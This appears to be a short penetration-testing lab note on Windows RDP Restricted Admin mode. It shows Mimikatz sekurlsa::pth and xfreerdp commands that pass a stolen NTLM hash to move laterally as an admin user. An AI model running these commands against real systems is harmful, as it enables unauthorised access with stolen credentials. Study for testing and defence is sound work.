# Mimikatz - Pass the hashes and Restricted Admin Mode

Restricted admin mode is disabled by default but the setting can be controlled through the DisableRestrictedAdmin registry entry at the following path :

```REG
HKLM:\System\CurrentControlSet\Control\LSA
```

While restricted admin mode protects against credential theft on the target, it is now possible to pass the hash when doing lateral movement with mstsc.

We will assume that we already in possession of the admin user NTLM hash and are logged in to the Windows 10 client as the v0lk3n user. 

We can then run mimikatz from an administrative console and use the pth command to launch a mstsc.exe process in the context of the admin user :

```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:admin /domain:dev1 /ntlm:4236C25DEC35C2B26E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```

xfreerdp RDP client, which is installed on a Kali system by default, supports restricted remote admin connections as well.

```bash
kali@kali:~$ xfreerdp /u:admin /pth:4236C25DEC35C2B26E2EB3B9F05C425E /v:192.168.x.x /cert-ignore
```
